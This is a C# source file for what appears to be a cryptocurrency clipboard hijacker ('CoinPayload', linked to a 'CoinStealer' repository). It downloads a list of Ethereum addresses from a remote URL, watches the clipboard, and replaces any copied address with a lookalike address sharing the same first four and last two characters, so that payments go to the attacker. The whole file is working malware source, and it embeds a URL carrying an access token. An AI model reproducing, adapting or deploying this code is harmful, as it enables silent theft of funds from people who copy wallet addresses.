using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace CoinPayload
{
    public static class Program
    {
        static Regex Pattern = new Regex(@"(0X[a-f0-9]{40})", RegexOptions.IgnoreCase | RegexOptions.ExplicitCapture | RegexOptions.Multiline);
        static Dictionary<string, string> Changes = new Dictionary<string, string>();

        /// <summary>
        /// Punto de entrada principal para la aplicación.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
#if DEBUG
            if (Debugger.IsAttached)
            {
                args = new string[] { "https://raw.githubusercontent.com/shargon/CoinStealer/master/Samples/Addresses.txt?token=ADBW5Q7v31YTdQ8wlotdsdV93juszUEmks5aM6pJwA%3D%3D" };
            }
#endif
            // Check parameter
            if (args.Length == 0) return;
            if (!Uri.TryCreate(args[0], UriKind.RelativeOrAbsolute, out Uri uri)) return;

            // Download address list
            using (WebClient wb = new WebClient())
            {
                foreach (string dir in wb.DownloadString(uri).Split(new char[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries))
                    try
                    {
                        string sdir = dir;

                        if (!dir.StartsWith("0x", StringComparison.InvariantCultureIgnoreCase))
                            sdir = "0x" + sdir;

                        string sub = sdir.Substring(0, 4) + sdir.Substring(sdir.Length - 2, 2);
                        Changes[sub] = sdir;
                    }
                    catch { }
            }

            // Create a dummy control for intercept windows message
            ClipboardMonitor c = new ClipboardMonitor();
            c.ClipboardChanged += C_ClipboardChanged;
            Application.Run();
        }

        static void C_ClipboardChanged()
        {
            if (!Clipboard.ContainsText()) return;

            // Extract clipboard text
            bool change = false;
            string t = Clipboard.GetText();
            // Search address path
            foreach (Match m in Pattern.Matches(t))
            {
                string sub = m.Value.Substring(0, 4) + m.Value.Substring(m.Value.Length - 2, 2);

                // Search my replacement :)
                if (Changes.TryGetValue(sub, out string sc) && sc != m.Value)
                {
                    t = t.Replace(m.Value, sc);
                    change = true;
                }
            }

            if (change)
            {
                // Change it!
                Clipboard.SetText(t);
            }
        }
    }
}